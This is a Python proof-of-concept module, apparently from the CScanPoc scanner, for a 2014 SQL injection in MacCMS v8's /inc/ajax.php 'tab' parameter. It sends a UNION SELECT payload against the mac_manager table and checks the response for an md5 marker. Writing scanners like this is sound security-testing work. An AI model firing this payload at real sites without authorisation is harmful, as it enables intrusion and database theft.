# coding: utf-8

import urllib.request
import urllib.error
import urllib.parse
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MacCMS_0005'  # 平台漏洞编号，留空
    name = 'MacCMS v8 /inc_ajax.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-20'  # 漏洞公布时间
    desc = '''
    MacCMS V8版本中/inc/ajax.php文件tab参数未经过过滤带入SQL语句，导致SQL注入漏洞发生。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=063677'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    product = 'MacCMS'  # 漏洞应用名称
    product_version = 'v8'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7d29b046-dc21-481b-b3dc-0ff663b46ee5'
    author = 'cscan'  # POC编写者
    create_date = '2018-3-24'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        vul_url = '%s/inc/ajax.php?ac=digg&ac2=&id=1&tab=vod+' % self.target
        payload = 'union+select/**/+null,md5(1231412414)+from+mac_manager+--%20'
        try:
            path = vul_url+payload
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            content = urllib.request.urlopen(path).read()
            if 'efc2303c9fe1ac39f7bc336d2c1a1252' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
